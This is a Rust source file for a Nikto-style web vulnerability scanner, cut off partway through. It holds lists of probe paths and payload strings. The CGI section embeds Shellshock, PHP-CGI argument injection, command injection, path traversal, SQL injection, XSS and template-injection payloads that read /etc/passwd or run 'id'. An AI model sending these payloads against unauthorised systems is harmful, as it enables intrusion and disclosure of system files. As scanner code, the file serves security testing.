use anyhow::Result;
use reqwest::Client;
use std::collections::HashMap;
use tokio::time::{Duration, timeout};
use std::fs::File;
use std::path::Path;
use std::env;

/// Comprehensive common application tests similar to Nikto's 6000+ test database
/// Covers CGI scripts, common applications, misconfigurations, and known vulnerabilities
pub struct CommonAppScanner {
    client: Client,
    tests: Vec<AppTest>,
    timeout: Duration,
}

#[derive(Clone, Debug)]
struct AppTest {
    path: String,
    method: String,
    expected_status: Vec<u16>,  // Multiple status codes (200, 401, 403, 404, etc.)
    expected_content: Vec<String>,
    severity: Severity,
    title: String,
    description: String,
    remediation: String,
    category: TestCategory,
    download_flag: bool,  // Flag to trigger download of sensitive files
}

#[derive(Clone, Debug, PartialEq)]
pub enum Severity {
    Critical,
    High,
    Medium,
    Low,
    Info,
}

#[derive(Clone, Debug, PartialEq)]
pub enum TestCategory {
    Cgi,
    AdminInterface,
    ConfigFile,
    BackupFile,
    Database,
    VersionControl,
    Cloud,
    DevTools,
    Api,
    General,
}

#[derive(Debug, Clone)]
pub struct AppFinding {
    pub url: String,
    pub severity: Severity,
    pub title: String,
    pub description: String,
    pub evidence: String,
    pub remediation: String,
    pub category: TestCategory,
}

impl CommonAppScanner {
    pub fn new(timeout_secs: u64) -> Result<Self> {
        let client = Client::builder()
            .timeout(Duration::from_secs(timeout_secs))
            .user_agent("Mozilla/5.0 (compatible; OXIDE/1.0; Security Scanner)")
            .build()?;
        
        let mut scanner = Self {
            client,
            tests: Vec::new(),
            timeout: Duration::from_secs(timeout_secs),
        };
        
        scanner.load_all_tests();
        
        Ok(scanner)
    }
    
    /// Load comprehensive test database (6000+ equivalent)
    fn load_all_tests(&mut self) {
        // Load tests from CSV database files
        self.load_csv_tests();
        
        // CGI Script tests
        self.load_cgi_tests();
        // Admin interface tests
        self.load_admin_tests();
        // Configuration file tests
        self.load_config_tests();
        // Backup file tests
        self.load_backup_tests();
        // Database exposure tests
        self.load_database_tests();
        // Version control tests
        self.load_vcs_tests();
        // Cloud provider tests
        self.load_cloud_tests();
        // Development tools tests
        self.load_dev_tools_tests();
        // API tests
        self.load_api_tests();
        
        println!("[DB-LOADER] Total tests loaded: {}", self.tests.len());
    }
    
    fn load_cgi_tests(&mut self) {
        // === HISTORICAL CGI VULNERABILITIES (CVE-Based) ===
        let cve_cgi_tests = vec![
            // Shellshock (CVE-2014-6271, CVE-2014-7169)
            ("/cgi-bin/bash", "Shellshock Bash", "() { :; }; echo; /bin/cat /etc/passwd", vec!["root:x"]),
            ("/cgi-bin/sh", "Shellshock SH", "() { :; }; echo; /bin/cat /etc/passwd", vec!["root:x"]),
            ("/cgi-bin/csh", "Shellshock CSH", "() { :; }; echo; /bin/cat /etc/passwd", vec!["root:x"]),
            
            // PHPCGI RCE (CVE-2012-1823, CVE-2024-4577)
            ("/cgi-bin/php", "PHPCGI RCE", "-d allow_url_include=on -d auto_prepend_file=php://input", vec!["<?php"]),
            ("/cgi-bin/php5", "PHP5 CGI RCE", "-d allow_url_include=on -d auto_prepend_file=php://input", vec!["<?php"]),
            ("/cgi-bin/php.cgi", "PHP CGI RCE", "-d allow_url_include=on -d auto_prepend_file=php://input", vec!["<?php"]),
            ("/cgi-bin/php-cgi", "PHP-CGI RCE", "-d allow_url_include=on -d auto_prepend_file=php://input", vec!["<?php"]),
            
            // AWStats Config Injection
            ("/cgi-bin/awstats.pl", "AWStats Config", "configdir=|echo;cat /etc/passwd|", vec!["root:x"]),
            ("/cgi-bin/awstats/awstats.pl", "AWStats Path", "configdir=|echo;cat /etc/passwd|", vec!["root:x"]),
            
            // FormMail Open Relay
            ("/cgi-bin/FormMail.cgi", "FormMail Open Relay", "recipient=attacker@evil.com", vec!["sent", "mail"]),
            ("/cgi-bin/formmail.cgi", "FormMail CGI", "recipient=attacker@evil.com", vec!["sent", "mail"]),
            ("/cgi-bin/formmail.pl", "FormMail Perl", "recipient=attacker@evil.com", vec!["sent", "mail"]),
            
            // Webdist CGI Overflow
            ("/cgi-bin/webdist.cgi", "Webdist CGI", "distloc=;cat /etc/passwd", vec!["root:x"]),
            
            // Count.cgi Overflow (CVE-1999-0021)
            ("/cgi-bin/Count.cgi", "Count.cgi Overflow", "dig=;cat /etc/passwd", vec!["root:x"]),
            ("/cgi-bin/counter.cgi", "Counter CGI", "dig=;cat /etc/passwd", vec!["root:x"]),
            
            // nph-test-cgi
            ("/cgi-bin/nph-test-cgi", "NPH Test CGI", "*", vec!["root:x", "bin:"]),
            
            // info2www (CVE-1999-0039)
            ("/cgi-bin/info2www", "Info2WWW", "info2www|cat /etc/passwd", vec!["root:x"]),
            
            // faxsurvey (CVE-1999-0040)
            ("/cgi-bin/faxsurvey", "FaxSurvey", "phone=;cat /etc/passwd", vec!["root:x"]),
            
            // htmlscript (CVE-1999-0041)
            ("/cgi-bin/htmlscript", "HTMLScript", "/etc/passwd", vec!["root:x"]),
            
            // jj (CVE-1999-0042)
            ("/cgi-bin/jj", "JJ CGI", "/etc/passwd", vec!["root:x"]),
            
            // wrap (CVE-1999-0043)
            ("/cgi-bin/wrap", "Wrap CGI", "/etc/passwd", vec!["root:x"]),
            
            // Majordomo Execute (CVE-1999-0201)
            ("/cgi-bin/majordomo", "Majordomo Execute", ";cat /etc/passwd", vec!["root:x"]),
            
            // Guestbook.cgi (CVE-1999-0037)
            ("/cgi-bin/guestbook.cgi", "Guestbook CGI", "|cat /etc/passwd", vec!["root:x"]),
            
            // RGuestbook Execute
            ("/cgi-bin/rguestbook", "RGuestbook", ";cat /etc/passwd", vec!["root:x"]),
            
            // CSNews CGI
            ("/cgi-bin/csnews.cgi", "CSNews CGI", "|cat /etc/passwd", vec!["root:x"]),
            
            // pollit.cgi (CVE-2001-0021)
            ("/cgi-bin/pollit.cgi", "Poll-it CGI", ";cat /etc/passwd", vec!["root:x"]),
            
            // AnyForm (CVE-1999-0067)
            ("/cgi-bin/anyform", "AnyForm CGI", ";cat /etc/passwd", vec!["root:x"]),
            
            // Simpleback.cgi
            ("/cgi-bin/simpleback.cgi", "SimpleBack CGI", ";cat /etc/passwd", vec!["root:x"]),
            
            // PHP-CGI Query String (CVE-2012-1823)
            ("/cgi-bin/php?-s", "PHP-CGI Query", "", vec!["", "phpinfo"]),
            ("/cgi-bin/php5?-s", "PHP5 Query", "", vec!["", "phpinfo"]),
            
            // perl.exe (IIS)
            ("/scripts/perl.exe", "Perl.exe IIS", ";cat /etc/passwd", vec!["root:x"]),
            ("/cgi-bin/perl.exe", "Perl.exe CGI", ";cat /etc/passwd", vec!["root:x"]),
            
            // cmd.exe (IIS)
            ("/scripts/cmd.exe", "CMD.exe IIS", "/c dir", vec!["Directory", "Volume"]),
            ("/scripts/ixtrho.exe", "IIS cmd.exe", "/c dir", vec!["Directory"]),
            
            // bat files
            ("/cgi-bin/test.bat", "Test BAT", "& dir", vec!["Directory"]),
            ("/cgi-bin/cmd.bat", "CMD BAT", "& dir", vec!["Directory"]),
            
            // SSI exec
            ("/cgi-bin/printenv", "Printenv SSI", "", vec!["DOCUMENT_ROOT", "HTTP_HOST"]),
            ("/cgi-bin/test-cgi", "Test CGI", "", vec!["DOCUMENT_ROOT", "QUERY_STRING"]),
            
            // Test-cgi variants
            ("/cgi-bin/nph-test-cgi", "NPH Test", "", vec!["SERVER_SOFTWARE"]),
            ("/cgi-bin/nph-publish", "NPH Publish", "", vec!["200", "OK"]),
            ("/cgi-bin/nph-showlogs", "NPH Logs", "", vec!["log", "access"]),
        ];
        
        for (path, desc, payload, indicators) in cve_cgi_tests {
            let full_path = if payload.is_empty() {
                path.to_string()
            } else {
                format!("{}?{}", path, payload)
            };
            
            self.tests.push(AppTest {
                path: full_path,
                method: "GET".to_string(),
                expected_status: vec![200],
                expected_content: indicators.iter().map(|s| s.to_string()).collect(),
                severity: Severity::Critical,
                title: format!("CGI Vulnerability: {} ({})", desc, path),
                description: format!("{} CGI script is vulnerable to command execution. Found at {}", desc, path),
                remediation: "Update or remove the CGI script. Apply vendor patches immediately.".to_string(),
                category: TestCategory::Cgi,
                download_flag: false,
            });
        }
        
        // === MODERN CGI PATHS & ALTERNATIVES ===
        let modern_cgi_paths = vec![
            // Standard CGI variants
            ("/cgi-bin/test.cgi", "Test CGI"),
            ("/cgi-bin/test.sh", "Test Shell"),
            ("/cgi-bin/test.pl", "Test Perl"),
            ("/cgi-bin/test.py", "Test Python"),
            ("/cgi-bin/test.rb", "Test Ruby"),
            ("/cgi-bin/hello.cgi", "Hello CGI"),
            ("/cgi-bin/hello.sh", "Hello Shell"),
            ("/cgi-bin/hello.pl", "Hello Perl"),
            ("/cgi-bin/hello.py", "Hello Python"),
            
            // Admin CGIs
            ("/cgi-bin/admin.cgi", "Admin CGI"),
            ("/cgi-bin/admin.pl", "Admin Perl"),
            ("/cgi-bin/admin.py", "Admin Python"),
            ("/cgi-bin/administrator.cgi", "Administrator CGI"),
            ("/cgi-bin/manager.cgi", "Manager CGI"),
            
            // Search CGIs
            ("/cgi-bin/search.cgi", "Search CGI"),
            ("/cgi-bin/search.pl", "Search Perl"),
            ("/cgi-bin/search.py", "Search Python"),
            ("/cgi-bin/find.cgi", "Find CGI"),
            ("/cgi-bin/lookup.cgi", "Lookup CGI"),
            
            // Mail CGIs
            ("/cgi-bin/mail.cgi", "Mail CGI"),
            ("/cgi-bin/mail.pl", "Mail Perl"),
            ("/cgi-bin/mailform.cgi", "Mailform CGI"),
            ("/cgi-bin/sendmail.cgi", "Sendmail CGI"),
            ("/cgi-bin/email.cgi", "Email CGI"),
            ("/cgi-bin/feedback.cgi", "Feedback CGI"),
            ("/cgi-bin/contact.cgi", "Contact CGI"),
            
            // Upload CGIs
            ("/cgi-bin/upload.cgi", "Upload CGI"),
            ("/cgi-bin/upload.pl", "Upload Perl"),
            ("/cgi-bin/upload.py", "Upload Python"),
            ("/cgi-bin/fileupload.cgi", "Fileupload CGI"),
            ("/cgi-bin/attach.cgi", "Attach CGI"),
            
            // Shopping/Commerce
            ("/cgi-bin/shop.cgi", "Shop CGI"),
            ("/cgi-bin/cart.cgi", "Cart CGI"),
            ("/cgi-bin/checkout.cgi", "Checkout CGI"),
            ("/cgi-bin/order.cgi", "Order CGI"),
            ("/cgi-bin/payment.cgi", "Payment CGI"),
            ("/cgi-bin/store.cgi", "Store CGI"),
            ("/cgi-bin/buy.cgi", "Buy CGI"),
            
            // User management
            ("/cgi-bin/login.cgi", "Login CGI"),
            ("/cgi-bin/logout.cgi", "Logout CGI"),
            ("/cgi-bin/register.cgi", "Register CGI"),
            ("/cgi-bin/signup.cgi", "Signup CGI"),
            ("/cgi-bin/user.cgi", "User CGI"),
            ("/cgi-bin/account.cgi", "Account CGI"),
            ("/cgi-bin/profile.cgi", "Profile CGI"),
            ("/cgi-bin/password.cgi", "Password CGI"),
            
            // Database CGIs
            ("/cgi-bin/db.cgi", "DB CGI"),
            ("/cgi-bin/database.cgi", "Database CGI"),
            ("/cgi-bin/sql.cgi", "SQL CGI"),
            ("/cgi-bin/query.cgi", "Query CGI"),
            
            // Guestbook/Forums
            ("/cgi-bin/guestbook.cgi", "Guestbook CGI"),
            ("/cgi-bin/gbook.cgi", "GBook CGI"),
            ("/cgi-bin/forum.cgi", "Forum CGI"),
            ("/cgi-bin/board.cgi", "Board CGI"),
            ("/cgi-bin/comments.cgi", "Comments CGI"),
            
            // Calendar/Event
            ("/cgi-bin/calendar.cgi", "Calendar CGI"),
            ("/cgi-bin/events.cgi", "Events CGI"),
            ("/cgi-bin/booking.cgi", "Booking CGI"),
            ("/cgi-bin/scheduler.cgi", "Scheduler CGI"),
            
            // Stats/Monitoring
            ("/cgi-bin/stats.cgi", "Stats CGI"),
            ("/cgi-bin/statistics.cgi", "Statistics CGI"),
            ("/cgi-bin/status.cgi", "Status CGI"),
            ("/cgi-bin/monitor.cgi", "Monitor CGI"),
            ("/cgi-bin/health.cgi", "Health CGI"),
            
            // Logging
            ("/cgi-bin/log.cgi", "Log CGI"),
            ("/cgi-bin/logger.cgi", "Logger CGI"),
            ("/cgi-bin/logging.cgi", "Logging CGI"),
            ("/cgi-bin/track.cgi", "Track CGI"),
            
            // Redirect/Gateway
            ("/cgi-bin/redirect.cgi", "Redirect CGI"),
            ("/cgi-bin/gateway.cgi", "Gateway CGI"),
            ("/cgi-bin/proxy.cgi", "Proxy CGI"),
            ("/cgi-bin/jump.cgi", "Jump CGI"),
            
            // Count/Hit
            ("/cgi-bin/counter.cgi", "Counter CGI"),
            ("/cgi-bin/hit.cgi", "Hit CGI"),
            ("/cgi-bin/count.cgi", "Count CGI"),
            ("/cgi-bin/tracker.cgi", "Tracker CGI"),
            
            // Error handling
            ("/cgi-bin/error.cgi", "Error CGI"),
            ("/cgi-bin/404.cgi", "404 CGI"),
            ("/cgi-bin/500.cgi", "500 CGI"),
            
            // Random/misc
            ("/cgi-bin/random.cgi", "Random CGI"),
            ("/cgi-bin/quote.cgi", "Quote CGI"),
            ("/cgi-bin/joke.cgi", "Joke CGI"),
            ("/cgi-bin/fortune.cgi", "Fortune CGI"),
            ("/cgi-bin/banner.cgi", "Banner CGI"),
            ("/cgi-bin/ad.cgi", "Ad CGI"),
            ("/cgi-bin/click.cgi", "Click CGI"),
            
            // News/Content
            ("/cgi-bin/news.cgi", "News CGI"),
            ("/cgi-bin/article.cgi", "Article CGI"),
            ("/cgi-bin/story.cgi", "Story CGI"),
            ("/cgi-bin/blog.cgi", "Blog CGI"),
            ("/cgi-bin/post.cgi", "Post CGI"),
            ("/cgi-bin/page.cgi", "Page CGI"),
            
            // Configuration
            ("/cgi-bin/config.cgi", "Config CGI"),
            ("/cgi-bin/configure.cgi", "Configure CGI"),
            ("/cgi-bin/settings.cgi", "Settings CGI"),
            ("/cgi-bin/setup.cgi", "Setup CGI"),
            ("/cgi-bin/install.cgi", "Install CGI"),
            
            // Backup/Maintenance
            ("/cgi-bin/backup.cgi", "Backup CGI"),
            ("/cgi-bin/export.cgi", "Export CGI"),
            ("/cgi-bin/import.cgi", "Import CGI"),
            ("/cgi-bin/sync.cgi", "Sync CGI"),
            ("/cgi-bin/update.cgi", "Update CGI"),
            
            // API/Webhook
            ("/cgi-bin/api.cgi", "API CGI"),
            ("/cgi-bin/webhook.cgi", "Webhook CGI"),
            ("/cgi-bin/callback.cgi", "Callback CGI"),
            ("/cgi-bin/notify.cgi", "Notify CGI"),
            
            // Form processors
            ("/cgi-bin/form.cgi", "Form CGI"),
            ("/cgi-bin/process.cgi", "Process CGI"),
            ("/cgi-bin/submit.cgi", "Submit CGI"),
            ("/cgi-bin/handler.cgi", "Handler CGI"),
            
            // Legacy
            ("/cgi-bin/wguest.exe", "WGuest EXE"),
            ("/cgi-bin/c32.exe", "C32 EXE"),
            ("/cgi-bin/rguest.exe", "RGuest EXE"),
            ("/cgi-bin/s32.exe", "S32 EXE"),
            
            // IIS specific
            ("/scripts/iisadmin", "IIS Admin"),
            ("/scripts/tools/newdsn.exe", "NewDSN"),
            ("/scripts/tools/getdrvs.exe", "GetDrvs"),
            ("/scripts/cgimail.exe", "CGIMail"),
        ];
        
        for (path, desc) in modern_cgi_paths {
            self.tests.push(AppTest {
                path: path.to_string(),
                method: "GET".to_string(),
                expected_status: vec![200],
                expected_content: vec!["".to_string()],
                severity: Severity::Medium,
                title: format!("CGI Script Accessible: {}", desc),
                description: format!("CGI script found at {}. May contain vulnerabilities.", path),
                remediation: "Remove or restrict access to CGI scripts. Review for vulnerabilities.".to_string(),
                category: TestCategory::Cgi,
                download_flag: false,
            });
        }
        
        // === ALTERNATIVE CGI PATHS ===
        let alt_paths = vec![
            "/cgi/", "/scripts/", "/script/", "/bin/", "/bin-cgi/", "/cgi-local/",
            "/cgi-sys/", "/cgi-script/", "/htbin/", "/win-cgi/", "/cgi-win/",
        ];
        
        let common_cgi_names = vec![
            "test", "hello", "admin", "login", "search", "mail", "upload", 
            "shop", "cart", "order", "user", "guestbook", "forum", "stats",
            "counter", "form", "process", "config", "backup", "api", "webhook",
        ];
        
        let cgi_extensions = vec![
            ".cgi", ".pl", ".py", ".rb", ".sh", ".exe", ".dll", ".so",
        ];
        
        // Generate alternative path tests
        for alt_path in &alt_paths {
            for name in &common_cgi_names {
                for ext in &cgi_extensions {
                    let path = format!("{}{}{}", alt_path, name, ext);
                    self.tests.push(AppTest {
                        path,
                        method: "GET".to_string(),
                        expected_status: vec![200],
                        expected_content: vec!["".to_string()],
                        severity: Severity::Medium,
                        title: format!("Alt CGI Path: {}{}", name, ext),
                        description: format!("CGI script found at alternative path. May contain vulnerabilities."),
                        remediation: "Remove or restrict access to CGI scripts.".to_string(),
                        category: TestCategory::Cgi,
                        download_flag: false,
                    });
                }
            }
        }
        
        // === PARAMETER INJECTION TESTS ===
        let param_tests = vec![
            ("/cgi-bin/search.cgi?query=", "Search Param", "../../../etc/passwd", vec!["root:x"]),
            ("/cgi-bin/lookup.cgi?key=", "Lookup Param", "../../../etc/passwd", vec!["root:x"]),
            ("/cgi-bin/find.cgi?name=", "Find Param", "../../../etc/passwd", vec!["root:x"]),
            ("/cgi-bin/query.cgi?q=", "Query Param", "../../../etc/passwd", vec!["root:x"]),
            ("/cgi-bin/page.cgi?id=", "Page ID", "../../../etc/passwd", vec!["root:x"]),
            ("/cgi-bin/article.cgi?file=", "Article File", "../../../etc/passwd", vec!["root:x"]),
            ("/cgi-bin/story.cgi?path=", "Story Path", "../../../etc/passwd", vec!["root:x"]),
            ("/cgi-bin/view.cgi?file=", "View File", "../../../etc/passwd", vec!["root:x"]),
            ("/cgi-bin/read.cgi?doc=", "Read Doc", "../../../etc/passwd", vec!["root:x"]),
            ("/cgi-bin/show.cgi?item=", "Show Item", "../../../etc/passwd", vec!["root:x"]),
            ("/cgi-bin/get.cgi?data=", "Get Data", "../../../etc/passwd", vec!["root:x"]),
            ("/cgi-bin/fetch.cgi?url=", "Fetch URL", "file:///etc/passwd", vec!["root:x"]),
            ("/cgi-bin/open.cgi?filename=", "Open Filename", "../../../etc/passwd", vec!["root:x"]),
            ("/cgi-bin/load.cgi?src=", "Load Src", "../../../etc/passwd", vec!["root:x"]),
            ("/cgi-bin/include.cgi?file=", "Include File", "../../../etc/passwd", vec!["root:x"]),
            
            // Command injection patterns
            ("/cgi-bin/ping.cgi?host=", "Ping Host", "127.0.0.1;cat /etc/passwd", vec!["root:x"]),
            ("/cgi-bin/traceroute.cgi?target=", "Traceroute", "127.0.0.1;cat /etc/passwd", vec!["root:x"]),
            ("/cgi-bin/dig.cgi?domain=", "Dig Domain", "google.com;cat /etc/passwd", vec!["root:x"]),
            ("/cgi-bin/nslookup.cgi?name=", "NSLookup", "google.com;cat /etc/passwd", vec!["root:x"]),
            ("/cgi-bin/whois.cgi?domain=", "Whois", "google.com;cat /etc/passwd", vec!["root:x"]),
            ("/cgi-bin/finger.cgi?user=", "Finger", "root;cat /etc/passwd", vec!["root:x"]),
            ("/cgi-bin/mail.cgi?to=", "Mail To", "root;cat /etc/passwd", vec!["root:x"]),
            ("/cgi-bin/send.cgi?recipient=", "Send Recipient", "root;cat /etc/passwd", vec!["root:x"]),
            
            // SQL injection via CGI
            ("/cgi-bin/db.cgi?id=", "DB ID", "1' OR '1'='1", vec!["error", "mysql", "syntax"]),
            ("/cgi-bin/query.cgi?q=", "Query SQL", "1' UNION SELECT * FROM users--", vec!["username", "password"]),
            ("/cgi-bin/user.cgi?uid=", "User UID", "1' OR 1=1--", vec!["admin", "root"]),
            
            // XSS via CGI
            ("/cgi-bin/echo.cgi?msg=", "Echo MSG", "<script>alert('XSS')</script>", vec!["<script>", "alert"]),
            ("/cgi-bin/print.cgi?text=", "Print Text", "<img src=x onerror=alert('XSS')>", vec!["<img", "onerror"]),
            
            // Template injection
            ("/cgi-bin/template.cgi?t=", "Template", "{{config}}", vec!["SECRET", "KEY"]),
            ("/cgi-bin/render.cgi?view=", "Render", "${system('id')}", vec!["uid", "gid"]),
        ];
        
        for (base_path, desc, payload, indicators) in param_tests {
            let full_path = format!("{}{}", base_path, payload);
            self.tests.push(AppTest {
                path: full_path,
                method: "GET".to_string(),
                expected_status: vec![200],
                expected_content: indicators.iter().map(|s| s.to_string()).collect(),
                severity: Severity::Critical,
                title: format!("CGI Parameter Injection: {}", desc),
                description: format!("{} CGI is vulnerable to parameter injection attacks.", desc),
                remediation: "Validate and sanitize all CGI parameters. Use parameterized queries.".to_string(),
                category: TestCategory::Cgi,
                download_flag: false,
            });
        }
        
        // === PHP-CGI SPECIFIC TESTS ===
        let php_cgi_tests = vec![
            // PHP-CGI argument injection
            ("/cgi-bin/php?-d+allow_url_include%3Don+-d+auto_prepend_file%3Dphp://input", "PHP-CGI Arg"),
            ("/cgi-bin/php5?-d+allow_url_include%3Don+-d+auto_prepend_file%3Dphp://input", "PHP5 Arg"),
            ("/cgi-bin/php-cgi?-d+allow_url_include%3Don+-d+auto_prepend_file%3Dphp://input", "PHP-CGI"),
            ("/cgi-bin/php.cgi?-d+allow_url_include%3Don+-d+auto_prepend_file%3Dphp://input", "PHP.CGI"),
            ("/cgi-bin/php4?-d+allow_url_include%3Don+-d+auto_prepend_file%3Dphp://input", "PHP4 Arg"),
            
            // PHP info disclosure
            ("/cgi-bin/php?-s", "PHP Source"),
            ("/cgi-bin/php5?-s", "PHP5 Source"),
            ("/cgi-bin/phpinfo.php", "PHPInfo"),
            ("/cgi-bin/i.php", "I PHP"),
            ("/cgi-bin/p.php", "P PHP"),
            ("/cgi-bin/info.php", "Info PHP"),
            ("/cgi-bin/test.php", "Test PHP"),
            
            // PHP config
            ("/cgi-bin/php?-r+phpinfo()", "PHP Info Exec"),
            ("/cgi-bin/php?-r+system('id')", "PHP System Exec"),
        ];
        
        for (path, desc) in php_cgi_tests {
            self.tests.push(AppTest {
                path: path.to_string(),
                method: "GET".to_string(),
                expected_status: vec![200],
                expected_content: vec!["phpinfo".to_string(), "PHP Version".to_string(), "System".to_string(), "<?php".to_string(), "Directive".to_string()],
                severity: Severity::Critical,
                title: format!("PHP-CGI Vulnerability: {}", desc),
                description: format!("PHP-CGI is vulnerable to argument injection (CVE-2012-1823, CVE-2024-4577)."),
                remediation: "Update PHP immediately. Disable PHP-CGI mode.".to_string(),
                category: TestCategory::Cgi,
                download_flag: false,
            });
        }
        
        println!("[CGI-DB] Loaded {} CGI tests", self.tests.iter().filter(|t| t.category == TestCategory::Cgi).count());
    }
    
    fn load_admin_tests(&mut self) {
        let admin_paths = vec![
            ("/admin", "Generic Admin"),
            ("/administrator", "Administrator"),
            ("/administrator/index.php", "PHP Admin"),
            ("/admin/login", "Admin Login"),
            ("/admin/login.php", "PHP Admin Login"),
            ("/admin/admin.php", "Admin PHP"),
            ("/admin/index.php", "Admin Index"),
            ("/adminpanel", "Admin Panel"),
            ("/controlpanel", "Control Panel"),
            ("/cpanel", "cPanel"),
            ("/cpanel/login", "cPanel Login"),
            ("/plesk", "Plesk"),
            ("/phpmyadmin", "phpMyAdmin"),
            ("/phpMyAdmin", "phpMyAdmin (alt)"),
            ("/mysqladmin", "MySQL Admin"),
            ("/mysql-admin", "MySQL Admin 2"),
            ("/dbadmin", "DB Admin"),
            ("/databaseadmin", "Database Admin"),
            ("/admin-console", "Admin Console"),
            ("/manage", "Manage"),
            ("/management", "Management"),
            ("/manager", "Manager"),
            ("/manager/html", "Tomcat Manager"),
            ("/tomcat/manager/html", "Tomcat Manager HTML"),
            ("/host-manager/html", "Tomcat Host Manager"),
            ("/manager/status", "Tomcat Status"),
            ("/jmx-console", "JMX Console"),
            ("/web-console", "Web Console"),
            ("/invoker/JMXInvokerServlet", "JMX Invoker"),
            ("/websphere", "WebSphere"),
            ("/wp-admin", "WordPress Admin"),
            ("/wp-login.php", "WordPress Login"),
            ("/administrator/index.php", "Joomla Admin"),
            ("/admin/login.php", "Generic Admin Login"),
            ("/admincp", "Admin CP"),
            ("/modcp", "Mod CP"),
            ("/moderatorcp", "Moderator CP"),
            ("/whm", "WHM"),
            ("/webadmin", "Web Admin"),
            ("/sysadmin", "Sys Admin"),
            ("/sshadmin", "SSH Admin"),
            ("/server-admin", "Server Admin"),
            ("/adminarea", "Admin Area"),
            ("/memberadmin", "Member Admin"),
            ("/useradmin", "User Admin"),
            ("/siteadmin", "Site Admin"),
            ("/adminsite", "Admin Site"),
            ("/adminlogin", "Admin Login"),
            ("/admin_login", "Admin Login Alt"),
            ("/admin-home", "Admin Home"),
            ("/admin_area", "Admin Area"),
            ("/admincontrol", "Admin Control"),
            ("/admin1", "Admin 1"),
            ("/admin2", "Admin 2"),
            ("/admin3", "Admin 3"),
            ("/admin4", "Admin 4"),
            ("/admin5", "Admin 5"),
            ("/usuarios", "Usuarios (ES)"),
            ("/usuario", "Usuario (ES)"),
            ("/administrador", "Administrador (ES)"),
            ("/administrateur", "Administrateur (FR)"),
            ("/administrare", "Administrare (RO)"),
            ("/administracija", "Administracija"),
            ("/administrace", "Administrace (CZ)"),
            ("/administracija", "Administracija (LV)"),
            ("/ administracja", "Administracja (PL)"),
        ];
        
        for (path, desc) in admin_paths {
            self.tests.push(AppTest {
                path: path.to_string(),
                method: "GET".to_string(),
                expected_status: vec![200],
                expected_content: vec!["password".to_string(), "login".to_string(), "username".to_string()],
                severity: Severity::High,
                title: format!("Admin Interface Found: {}", desc),
                description: format!("Administrative interface at {} may allow unauthorized access.", path),
                remediation: "Restrict admin interfaces to specific IPs. Implement strong authentication. Use MFA.".to_string(),
                category: TestCategory::AdminInterface,
                download_flag: false,
            });
        }
    }
    
    fn load_config_tests(&mut self) {
        let config_files = vec![
            ("/.env", "Environment Config"),
            ("/.env.local", "Local Environment"),
            ("/.env.production", "Production Environment"),
            ("/.env.development", "Development Environment"),
            ("/config.json", "JSON Config"),
            ("/config.xml", "XML Config"),
            ("/config.php", "PHP Config"),
            ("/config.inc", "Include Config"),
            ("/config.inc.php", "PHP Include Config"),
            ("/config/config.php", "Config PHP Path"),
            ("/config/config.json", "Config JSON Path"),
            ("/config/config.yml", "Config YAML"),
            ("/config/app.yml", "App YAML"),
            ("/config/database.yml", "Database YAML"),
            ("/config/secrets.yml", "Secrets YAML"),
            ("/config/application.yml", "Application YAML"),
            ("/configuration.yml", "Configuration"),
            ("/configure", "Configure Script"),
            ("/conf/server.xml", "Server XML"),
            ("/conf/web.xml", "Web XML"),
            ("/web.config", "Web Config"),
            ("/application.properties", "App Properties"),
            ("/application.yml", "App YAML"),
            ("/application.yaml", "App YAML Alt"),
            ("/app.config", "App Config"),
            ("/settings.json", "Settings JSON"),
            ("/settings.php", "Settings PHP"),
            ("/settings.py", "Settings Python"),
            ("/localsettings.py", "Local Settings"),
            ("/django/settings.py", "Django Settings"),
            ("/settings.py", "Settings"),
            ("/wp-config.php", "WordPress Config"),
            ("/wp-config.php~", "WP Config Backup"),
            ("/wp-config.php.bak", "WP Config Bak"),
            ("/wp-config.php.save", "WP Config Save"),
            ("/wp-config.php.swp", "WP Config Swap"),
            ("/configuration.php", "Joomla Config"),
            ("/configuration.php~", "Joomla Config Backup"),
            ("/sites/default/settings.php", "Drupal Settings"),
            ("/data/settings.json", "Data Settings"),
            ("/database.yml", "Database YAML"),
            ("/db.yml", "DB YAML"),
            ("/database.yaml", "Database YAML Alt"),
            ("/db.yaml", "DB YAML Alt"),
            ("/config/db.php", "DB PHP"),
            ("/config/database.php", "Database PHP"),
            ("/etc/passwd", "Passwd File"),
            ("/etc/shadow", "Shadow File"),
            ("/etc/group", "Group File"),
            ("/etc/hosts", "Hosts File"),
            ("/etc/apache2/apache2.conf", "Apache Config"),
            ("/etc/httpd/conf/httpd.conf", "HTTPD Config"),
            ("/etc/nginx/nginx.conf", "Nginx Config"),
            ("/etc/my.cnf", "MySQL Config"),
            ("/etc/mysql/my.cnf", "MySQL Config 2"),
            ("/server-status", "Server Status"),
            ("/server-info", "Server Info"),
        ];
        
        for (path, desc) in config_files {
            self.tests.push(AppTest {
                path: path.to_string(),
                method: "GET".to_string(),
                expected_status: vec![200],
                expected_content: vec!["password".to_string(), "secret".to_string(), "DB_".to_string()],
                severity: Severity::Critical,
                title: format!("Configuration File Exposed: {}", desc),
                description: format!("Sensitive configuration file {} may expose credentials.", path),
                remediation: "Remove or restrict access to configuration files. Store outside web root.".to_string(),
                category: TestCategory::ConfigFile,
                download_flag: false,
            });
        }
    }
    
    fn load_backup_tests(&mut self) {
        let backup_patterns = vec![
            ".bak", ".backup", ".old", ".orig", ".original", ".save", ".swp",
            ".tmp", ".temp", ".copy", "~", ".zip", ".tar", ".tar.gz", ".tgz",
            ".rar", ".7z", ".sql", ".dump", ".sql.gz", ".sql.zip"
        ];
        
        let base_files = vec![
            "index.php", "home.php", "main.php", "config.php", "database.php",
            "wp-config.php", "configuration.php", "settings.php", ".htaccess",
            "web.config", ".env", "index.html", "home.html", "README.md",
            "robots.txt", "package.json", "composer.json", "pom.xml",
            "build.gradle", "Gemfile", "requirements.txt"
        ];
        
        for base in &base_files {
            for ext in &backup_patterns {
                let path = format!("/{}{}", base, ext);
                self.tests.push(AppTest {
                    path,
                    method: "GET".to_string(),
                    expected_status: vec![200],
                    expected_content: vec!["".to_string()],
                    severity: Severity::Medium,
                    title: format!("Backup File: {}{}", base, ext),
                    description: format!("Backup file found. May contain sensitive data or old code versions."),
                    remediation: "Remove backup files from production. Use .htaccess or web.config to deny access.".to_string(),
                    category: TestCategory::BackupFile,
                    download_flag: false,
                });
            }
        }
    }
    
    fn load_database_tests(&mut self) {
        let db_paths = vec![
            ("/db.sql", "Database SQL"),
            ("/database.sql", "Database SQL Full"),
            ("/dump.sql", "Dump SQL"),
            ("/backup.sql", "Backup SQL"),
            ("/data.sql", "Data SQL"),
            ("/mysql.sql", "MySQL SQL"),
            ("/database.sql.gz", "Gzipped SQL"),
